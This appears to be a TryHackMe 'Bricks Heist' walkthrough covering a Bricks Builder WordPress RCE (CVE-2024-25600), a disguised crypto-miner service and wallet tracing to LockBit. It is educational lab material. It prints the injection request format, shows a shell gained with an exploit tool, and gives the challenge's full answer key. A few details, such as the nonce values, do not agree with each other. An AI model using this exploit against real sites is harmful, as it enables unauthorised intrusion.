# TryHack3M: Bricks Heist - Complete Walkthrough

<div align="center">

![TryHackMe](https://img.shields.io/badge/TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web%20|%20Forensics%20|%20OSINT-blue?style=for-the-badge)

**From Three Million Bricks to Three Million Transactions**

*A comprehensive analysis of a compromised WordPress server, crypto mining malware, and attribution to a notorious ransomware group*

</div>

---

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [Environment Setup](#environment-setup)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: Exploitation](#phase-2-exploitation)
- [Phase 3: Post-Exploitation Analysis](#phase-3-post-exploitation-analysis)
- [Question Solutions](#question-solutions)
- [Tools & Resources](#tools--resources)
- [Key Findings](#key-findings)
- [References](#references)

---

## Challenge Overview

### Challenge Information

| Property | Details |
|----------|---------|
| **Room Name** | TryHack3M: Bricks Heist |
| **Difficulty Level** | Medium |
| **Categories** | Web Exploitation, Digital Forensics, Threat Intelligence |
| **Target Domain** | `bricks.thm` |
| **Date Completed** | January 2026 |

### Scenario

Brick Press Media Co. was developing a new web theme representing a renowned wall using three million byte bricks. Following a security incident, the server has been compromised and access has been lost. The objective is to regain access to the server and conduct a thorough investigation to determine the attack vector and identify the threat actors involved.

**Mission Objectives:**
- Regain access to the compromised server
- Identify the initial attack vector
- Locate and analyze malicious artifacts
- Trace cryptocurrency transactions
- Attribute the attack to a threat actor group

---

## Environment Setup

### Initial Configuration

Add the target machine to your local hosts file:

```bash
# Add target to /etc/hosts
echo "<MACHINE_IP> bricks.thm" | sudo tee -a /etc/hosts
```

### Required Tools

Ensure the following tools are installed and configured:

- **RustScan** - Fast port scanner
- **Python 3.8+** - Scripting environment
- **BrickBreaker** - Custom CVE-2024-25600 exploit
- **CyberChef** - Data decoding toolkit
- **Web browser** - For OSINT and blockchain analysis

---

## Phase 1: Reconnaissance

### Port Scanning

Conduct a comprehensive port scan using RustScan:

```bash
rustscan -a bricks.thm --ulimit 5000 -- -sCV
```

#### Scan Results

<details>
<summary>View Screenshot: RustScan Results</summary>
<img width="2559" height="1305" alt="01-rustscan-results" src="https://github.com/user-attachments/assets/3774649d-2173-4801-b846-8eaf80323255" />
</details>

**Identified Services:**

| Port | Protocol | Service | Version | Notes |
|:----:|:--------:|---------|---------|-------|
| 22 | TCP | SSH | OpenSSH 8.2p1 Ubuntu | Standard SSH service |
| 80 | TCP | HTTP | Python WebSockify 3.8.10 | VNC proxy service |
| 443 | TCP | HTTPS | Apache (WordPress 6.5) | Primary web application |

### Web Application Analysis

#### Initial Observations

Accessing `https://bricks.thm` reveals:
- **Content Management System**: WordPress 6.5
- **Theme**: Bricks Builder
- **Administrative Interface**: `/phpmyadmin/` endpoint discovered

<details>
<summary>View Screenshot: Website Homepage</summary>
<img width="1382" height="818" alt="02-website-page" src="https://github.com/user-attachments/assets/ed6cc578-d31f-4d68-b348-c946d0165abb" />
</details>

#### JavaScript Analysis

Examination of the page source reveals critical information in the JavaScript configuration:

```javascript
var bricksData = {
    "ajaxUrl": "https:\/\/bricks.thm\/wp-admin\/admin-ajax.php",
    "restApiUrl": "https:\/\/bricks.thm\/wp-json\/bricks\/v1\/",
    "nonce": "dce9f95a2a",    // Authentication nonce
    "postId": "0"
};
```

**Key Findings:**

| Discovery | Value | Significance |
|-----------|-------|--------------|
| CMS Version | WordPress 6.5 | Potential vulnerability target |
| Theme | Bricks Builder | Known CVE exists |
| Admin User | `administrator` | Confirmed account |
| Security Nonce | `0aed3bea03` | Required for API requests |
| Database Access | `/phpmyadmin/` | Alternative access point |

---

## Phase 2: Exploitation

### Vulnerability Assessment

#### CVE-2024-25600 Analysis

<div align="center">

| CVE Identifier | CVSS Score | Vulnerability Type | Affected Versions |
|----------------|------------|-------------------|-------------------|
| **CVE-2024-25600** | **9.8 (Critical)** | Unauthenticated RCE | Bricks Builder ≤ 1.9.6 |

</div>

**Vulnerability Description:**

The vulnerability exists in the `prepare_query_vars_from_settings()` method where user-controlled input is passed directly to PHP's `eval()` function through the REST API endpoint `/wp-json/bricks/v1/render_element`. This allows unauthenticated attackers to execute arbitrary PHP code on the server.

**Attack Flow Diagram:**

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  PHASE 1: ATTACKER                                                          │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ POST /wp-json/bricks/v1/render_element                                │  │
│  │ Payload: {"nonce":"xxx", "element":{"settings":{"queryEditor":        │  │
│  │          "throw new Exception(`id`);"}} }                             │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│  PHASE 2: WORDPRESS + BRICKS BUILDER                                        │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ prepare_query_vars_from_settings()                                    │  │
│  │     └─> eval($user_controlled_input)  ◄── CRITICAL VULNERABILITY      │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│  PHASE 3: COMMAND EXECUTION                                                 │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ Arbitrary code execution as www-data/apache user                      │  │
│  │ Full server compromise achieved                                       │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Exploitation Process

#### Tool Setup

Install required dependencies:

```bash
# Using pipx (recommended)
pipx install httpx rich

# Alternative: Using virtual environment
python3 -m venv brickbreaker
source brickbreaker/bin/activate
pip install httpx rich
```

#### Exploit Execution

Launch the BrickBreaker exploit tool:

```bash
python3 brickbreaker.py https://bricks.thm
```

<details>
<summary>View Screenshot: Successful Exploitation</summary>
<img width="981" height="1040" alt="03-exploit-ui" src="https://github.com/user-attachments/assets/ebd79e0d-7445-4cd5-b01a-fd82ad2c088b" />
</details>

#### Exploitation Results

```
 ██████╗ ██████╗ ██╗ ██████╗██╗  ██╗    ██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗
 ██╔══██╗██╔══██╗██║██╔════╝██║ ██╔╝    ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
 ██████╔╝██████╔╝██║██║     █████╔╝     ██████╔╝██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝
 ██╔══██╗██╔══██╗██║██║     ██╔═██╗     ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
 ██████╔╝██║  ██║██║╚██████╗██║  ██╗    ██████╔╝██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

                   CVE-2024-25600 | RCE Exploit | v2.2.0 | by Constantines

✓ Nonce found: dce9f95a2a
✓ Target is VULNERABLE to CVE-2024-25600
  User: apache | Host: ip-10-81-181-56

╭────────────── BrickBreaker Shell ──────────────╮
│ Shell established!                             │
│ User: apache                                   │
│ Host: ip-10-81-181-56                          │
│ Type 'help' for commands, 'exit' to quit       │
╰────────────────────────────────────────────────╯

apache@ip-10-81-181-56:/data/www/default$
```

**Status: Shell access successfully established**

---

## Phase 3: Post-Exploitation Analysis

With shell access established, we proceed to investigate the compromised system and answer the challenge questions.

---

## Question Solutions

### Question 1: Hidden .txt File Content

**Question:** What is the content of the hidden .txt file in the web folder?

**Answer Format:** `***{****_*************************************}`

#### Investigation Process

```bash
# List all files in web directory including hidden files
apache@bricks:/var/www/html$ ls -la

# Output includes:
# 650c844110baced87e1606453b93f22a.txt
# index.php
# kod
# license.txt

# Read the hidden flag file
apache@bricks:/var/www/html$ cat 650c844110baced87e1606453b93f22a.txt
THM{fl4g_650c844110baced87e1606453b93f22a}
```

<details>
<summary>View Screenshot: Flag Discovery</summary>
<img width="969" height="1100" alt="Q1 Answer" src="https://github.com/user-attachments/assets/b498bca7-a680-46ca-986e-18e8bbca02fe" />
</details>

**Answer:** `THM{fl4g_650c844110baced87e1606453b93f22a}`

---

### Question 2: Suspicious Process Name

**Question:** What is the name of the suspicious process?

**Answer Format:** `************` (12 characters)

#### Investigation Process

Enumerate all running services:

```bash
apache@bricks:/var/www/html$ systemctl | grep running
```

**Suspicious Services Identified:**

| Service Name | Description | Status |
|-------------|-------------|--------|
| `ubuntu.service` | TRYHACK3M | Suspicious |
| `badr.service` | Badr Service | Suspicious |

#### Deep Dive: ubuntu.service

```bash
# Examine service configuration
apache@bricks:/var/www/html$ cat /etc/systemd/system/ubuntu.service

[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog    # ← Malicious binary
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```bash
# Check service status
apache@bricks:/var/www/html$ systemctl status ubuntu.service

● ubuntu.service - TRYHACK3M
   Main PID: 2810 (nm-inet-dialog)
   Status: "Running"
```

**Analysis:**

The process `nm-inet-dialog` is designed to mimic a legitimate NetworkManager component, but it's actually a cryptocurrency miner running as a persistent systemd service.

<details>
<summary>View Screenshot: Service Analysis</summary>
<img width="1447" height="1303" alt="Q2 Answer" src="https://github.com/user-attachments/assets/5c428213-c945-4ff6-8712-42be39e3ac8d" />
<img width="838" height="274" alt="Q2 Answer 2" src="https://github.com/user-attachments/assets/9a106add-489b-488c-bf41-95b349ef4142" />
<img width="911" height="246" alt="Q2 Answer 3" src="https://github.com/user-attachments/assets/b9c4f08c-4229-410c-a047-9536ee4b0298" />
</details>

**Answer:** `nm-inet-dialog`

---

### Question 3: Service Name Affiliated with Suspicious Process

**Question:** What is the service name affiliated with the suspicious process?

**Answer Format:** `******.*******`

#### Solution

Based on the previous investigation, the malicious cryptocurrency miner operates through a systemd service file designed to blend in with legitimate system services.

**Answer:** `ubuntu.service`

---

### Question 4: Miner Log File Name

**Question:** What is the log file name of the miner instance?

**Answer Format:** `****.****` (4+4 characters)

#### Investigation Process

**Step 1: Binary Analysis**

```bash
# Extract strings from the malicious binary
apache@bricks:/var/www/html$ strings /lib/NetworkManager/nm-inet-dialog | grep -iE "\.log|/var|/tmp"

# Output:
/var/tmp
/usr/tmp
```

**Step 2: Directory Examination**

```bash
# List NetworkManager directory contents
apache@bricks:/var/www/html$ ls -la /lib/NetworkManager/

# Results:
-rw-r--r-- 1 root root   66376 Nov  5 21:59 inet.conf    # ← Log file identified
-rwxr-xr-x 1 root root 6948448 Apr  8  2024 nm-inet-dialog
```

**Step 3: Log File Content Analysis**

```bash
# Examine log file contents
apache@bricks:/var/www/html$ cat /lib/NetworkManager/inet.conf | head

ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d30...
2025-11-05 21:57:43,607 [*] confbak: Ready!
2025-11-05 21:57:43,607 [*] Status: Mining!
2025-11-05 21:57:47,612 [*] Miner()
2025-11-05 21:57:47,612 [*] Bitcoin Miner Thread Started
```

<details>
<summary>View Screenshot: Miner Log File</summary>
<img width="1160" height="88" alt="Q4 Answer" src="https://github.com/user-attachments/assets/f1a66207-b9c8-4cd3-aaa4-49971ce233e6" />
<img width="817" height="446" alt="Q4 Answer 2" src="https://github.com/user-attachments/assets/07012d74-50f5-4ffa-a7f3-ca0e462692d6" />
<img width="889" height="316" alt="Q4 Answer 3" src="https://github.com/user-attachments/assets/e53f6aab-6f98-4bdd-a2ac-8acaa692c1c8" />
</details>

**Answer:** `inet.conf`

---

### Question 5: Wallet Address

**Question:** What is the wallet address of the miner instance?

**Answer Format:** `******************************************` (42 characters)

#### Decoding Process

**Step 1: Extract Encoded ID**

From `inet.conf`:
```
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
```

**Step 2: Hexadecimal to ASCII Conversion**

```bash
echo "5757314e65474e5962..." | xxd -r -p
```

Result:
```
WW1NeGNYbHJOemx0WTNBTldFHUTFhM0ps...
```

**Step 3: Base64 Decoding (Double-Encoded)**

Using CyberChef with the recipe: `From Hex → From Base64 → From Base64`

<details>
<summary>View Screenshot: CyberChef Decoding Process</summary>
<img width="2048" height="1113" alt="Q5 Answer" src="https://github.com/user-attachments/assets/9e5129f6-e466-45a8-8a0c-57a0ae0990f1" />
</details>

**Decoded Output:**
```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```

**Step 4: Extract Valid Address**

The output contains the wallet address duplicated. Extract the first valid 42-character Bitcoin Bech32 address.

**Answer:** `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

---

### Question 6: Threat Group Attribution

**Question:** The wallet address used has been involved in transactions between wallets belonging to which threat group?

**Answer Format:** `*******` (7 characters)

#### Investigation Process

**Step 1: Blockchain Analysis**

Navigate to [WalletExplorer.com](https://www.walletexplorer.com/) and search for the wallet address.

<details>
<summary>View Screenshot: WalletExplorer Search</summary>
<img width="2558" height="1478" alt="Q6 Answer" src="https://github.com/user-attachments/assets/8f49a80d-e839-4dc6-a62a-6449afdf39f4" />
</details>

**Step 2: Transaction Tracking**

Follow the largest transaction to wallet ID `[000003e028]` identified as `[bbae96bd628d5fee5314]`:

**Significant Transaction:**

| Date | Amount | Destination Address |
|------|--------|---------------------|
| 2023-05-12 | -3.857 BTC | `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM` |

<details>
<summary>View Screenshot: Transaction Details</summary>
<img width="1176" height="803" alt="Q6 Answer 2" src="https://github.com/user-attachments/assets/5e2f0d79-bae6-42c0-82c0-e9d56e161dca" />
<img width="1332" height="527" alt="Q6 Answer 3" src="https://github.com/user-attachments/assets/27dbe9d4-0ef5-45fb-b431-1e9d26255705" />
</details>

**Step 3: OSINT Research**

Google search query: `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM`

<details>
<summary>View Screenshot: OFAC Search Results</summary>
<img width="1704" height="1431" alt="Q6 Answer 4" src="https://github.com/user-attachments/assets/5ea00819-a1c4-4b53-aef2-d88f143a76d3" />
</details>

**Step 4: OFAC Sanctions Database**

The wallet address appears in the **Office of Foreign Assets Control (OFAC)** Cyber-related Designations list dated **February 20, 2024**:

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  OFAC - Office of Foreign Assets Control                                     │
│  Cyber-related Designations                                                  │
│  Publication Date: February 20, 2024                                         │
│                                                                              │
│  Title: "United States Sanctions Affiliates of Russia-Based                  │
│         LockBit Ransomware Group"                                            │
│                                                                              │
│  Digital Currency Address (XBT):                                             │
│  32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM                                          │
│                                                                              │
│  Associated Entity: LockBit Ransomware Group                                 │
└──────────────────────────────────────────────────────────────────────────────┘
```

**Answer:** `LockBit`

---

## Summary of Findings

<div align="center">

### Complete Answer Sheet

| Question | Answer | Category |
|:--------:|--------|----------|
| **Q1** | `THM{fl4g_650c844110baced87e1606453b93f22a}` | File Discovery |
| **Q2** | `nm-inet-dialog` | Process Analysis |
| **Q3** | `ubuntu.service` | Service Investigation |
| **Q4** | `inet.conf` | Log Analysis |
| **Q5** | `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` | Cryptocurrency Forensics |
| **Q6** | `LockBit` | Threat Attribution |

</div>

---

## Tools & Resources

### Primary Tools

<div align="center">

| Tool | Purpose | Repository / URL |
|------|---------|------------------|
| **RustScan** | High-speed port scanner and service detection | [github.com/RustScan/RustScan](https://github.com/bee-san/RustScan) |
| **BrickBreaker** | CVE-2024-25600 exploitation framework | Custom exploit tool |
| **CyberChef** | Multi-purpose data decoding and analysis | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef) |
| **WalletExplorer** | Blockchain transaction analysis platform | [walletexplorer.com](https://www.walletexplorer.com) |
| **OFAC Database** | Sanctions and threat actor attribution | [ofac.treasury.gov](https://ofac.treasury.gov) |

</div>

### Exploitation Tools

```bash
# BrickBreaker - Custom CVE-2024-25600 Exploit
python3 brickbreaker.py <target_url>

# Dependencies
pip install httpx rich
```

---

## Key Findings

### 1. Vulnerability Management

**Finding:** The target system was running Bricks Builder with CVE-2024-25600, disclosed in February 2024. The server remained unpatched months after disclosure.

**Recommendation:** Implement automated patch management and vulnerability scanning for WordPress themes and plugins.

### 2. Adversary Techniques

**Evasion Methods Observed:**

| Technique | Implementation | Purpose |
|-----------|----------------|---------|
| **Process Masquerading** | `nm-inet-dialog` | Mimics legitimate NetworkManager binary |
| **Service Disguise** | `ubuntu.service` | Blends with system services |
| **Log Obfuscation** | `inet.conf` | Appears as configuration file |

### 3. Cryptocurrency Forensics

**Attribution Chain:**

```
Mining Wallet
    ↓
Transaction Analysis
    ↓
Connected Wallet (3.857 BTC transfer)
    ↓
OFAC Sanctions Database
    ↓
LockBit Ransomware Group
```

### 4. Multi-Layer Encoding

**Obfuscation Scheme:**

```
Original Wallet Address
    ↓
Base64 Encoding (Layer 1)
    ↓
Base64 Encoding (Layer 2)
    ↓
Hexadecimal Encoding
    ↓
Stored in Log File
```

### 5. Threat Intelligence

Government sanctions databases such as OFAC provide critical intelligence for:
- Threat actor attribution
- Cryptocurrency tracking
- Ransomware group identification
- International cybercrime investigations

---

## Technical Lessons Learned

### Security Best Practices

1. **Patch Management**
   - Maintain current versions of all CMS components
   - Subscribe to security advisories for installed software
   - Implement automated vulnerability scanning

2. **Service Monitoring**
   - Review systemd services regularly
   - Audit process names against expected system binaries
   - Monitor for unusual resource consumption

3. **Log Analysis**
   - Implement centralized logging
   - Regular review of system logs
   - Alert on suspicious file creation in system directories

4. **Cryptocurrency Forensics**
   - Blockchain analysis is a viable attribution method
   - Government databases enhance threat intelligence
   - Follow transaction patterns to identify threat actors

---

## References

### Vulnerability Information

- [CVE-2024-25600 - National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2024-25600)
- [Bricks Builder RCE Disclosure - Snicco Security](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6)

### Threat Intelligence

- [OFAC Cyber-related Designations - February 2024](https://ofac.treasury.gov/recent-actions/20240220)
- [LockBit Ransomware Analysis - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)

### Exploitation Research

- [Original PoC Reference - Chocapikk](https://github.com/Chocapikk/CVE-2024-25600)
- [WordPress Security Hardening Guide](https://wordpress.org/support/article/hardening-wordpress/)

---

<div align="center">

**Author:** Constantines  
**Challenge Series:** TryHack3M  
**Completion Date:** January 2026

---

**If you found this walkthrough helpful, please consider giving it a star!**

</div>
